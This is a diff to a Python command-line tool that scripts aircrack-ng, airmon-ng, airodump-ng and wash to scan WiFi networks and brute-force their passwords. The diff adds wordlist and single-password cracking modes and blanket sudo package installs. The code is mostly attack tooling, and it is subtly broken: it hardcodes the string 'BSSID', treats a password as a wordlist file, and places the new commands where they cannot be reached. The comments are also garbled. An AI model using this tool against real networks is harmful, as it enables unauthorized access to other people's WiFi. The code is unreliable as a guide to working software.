@@ -28,7 +28,7 @@ Three. **Connecting to WiFi:**
 - Some of the instructions it makes use of, like `sudo` and `nmcli`, might need greater permissions or setup.
 - And recollect, best use this script on WiFi networks you are allowed to debris with. Hacking into someone else's WiFi without permission is a huge no-no!
 """
-# main
+
 import os
 import subprocess
 import sys
@@ -36,10 +36,13 @@ import platform
 import time
 from colorama import init, Fore, Style
 init()
+
 os.system('sudo apt-get update')
 os.system('sudo apt-get install pciutils')
 os.system('sudo apt-get install network-manager')
 os.system('sudo apt-get install wireless-tools')
+os.system('sudo pip3 install colorama')
+os.system('sudo apt-get upgrade')
 os.system('sudo pip3 install wash')
 print(Fore.RED + Style.BRIGHT + " [!] Make sure you have installed aircrack-ng, pciutilis, networkmanager, wireless-tools, setting up airodump-ng, airmon-ng. before continue" + Style.RESET_ALL)
 time.sleep(5.5)
@@ -79,6 +82,26 @@ def bruteforce_wifi(ssid):
         print("Bruteforcing WiFi:", ssid)
     except Exception as e:
         print("Error bruteforcing WiFi:", e)
+
+def bruteforce_custom_wordlist(ssid, wordlist):
+    try:
+        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'])
+        subprocess.run(['sudo', 'wash', '-i', 'wlan0mon'])
+        subprocess.run(['sudo', 'airodump-ng', '-w', 'output', '--essid', ssid, 'wlan0mon'])
+        subprocess.run(['sudo', 'aircrack-ng', '-w', wordlist, '-b', 'BSSID', 'output.cap'])
+        print("Bruteforcing WiFi with custom wordlist:", ssid)
+    except Exception as e:
+        print("Error bruteforcing WiFi with custom wordlist:", e)
+
+def bruteforce_specific_password(ssid, password):
+    try:
+        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'])
+        subprocess.run(['sudo', 'wash', '-i', 'wlan0mon'])
+        subprocess.run(['sudo', 'airodump-ng', '-w', 'output', '--essid', ssid, 'wlan0mon'])
+        subprocess.run(['sudo', 'aircrack-ng', '-w', password, '-b', 'BSSID', 'output.cap'])
+        print("Bruteforcing WiFi with specific password:", ssid)
+    except Exception as e:
+        print("Error bruteforcing WiFi with specific password:", e)
 
 def scan_wifi():
     try:
@@ -141,7 +164,9 @@ def main():
         ▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀      
 
         [scan] Scan WiFi Networks
-        [bruteforce] Bruteforce WiFi
+        [bruteforce] Bruteforce WiFi with Default wordlist file.
+        [bruteforce_custom] Bruteforce WiFi with Custom Wordlist
+        [bruteforce_specific] Bruteforce WiFi with Specific Password
         [connect] Connect to WiFi
         [usage] Guide command.
         [exit] Exit
@@ -156,17 +181,25 @@ def main():
         elif command.startswith("bruteforce"):
             ssid = command.split(" ")[1]
             bruteforce_wifi(ssid)
+        elif command.startswith("bruteforce_custom"):
+            ssid, wordlist = command.split(" ")[1], command.split(" ")[2]
+            bruteforce_custom_wordlist(ssid, wordlist)
+        elif command.startswith("bruteforce_specific"):
+            ssid, password = command.split(" ")[1], command.split(" ")[2]
+            bruteforce_specific_password(ssid, password)
         elif command.startswith("connect"):
             try:
                 ssid, password = command.split(" ")[1].split(":")
                 connect_wifi(ssid, password)
             except Exception as e:
-                print("Invalid 'connect' command format. Please use 'connect ssid:password'.")
+                print("Invalid 'connect' command format. Please use 'connect <ssid>:<password>'.")
         elif command == "usage":
             print("--- Usage ---")
             usage1="""
-            [scan] Just like that, no additional comamnds
-            [bruteforce] with target ssid > ( bruteforce targetssid )
+            [scan] Just like that, no additional commands
+            [bruteforce] with target ssid > ( bruteforce <targetssid> )
+            [bruteforce_custom] with target ssid and wordlist > ( bruteforce_custom targetssid <wordlist> ) Must move the wordlist to SHS folder
+            [bruteforce_specific] with target ssid and password > ( bruteforce_specic <targetssid> <password> )
             [connect] with ssid and password separated by ':' > ( connect targetssid:password12345 )
 
             make sure to install networkmanager, aircrack-ng, airmon-ng, airdump-ng and pywifi also you cannot use 
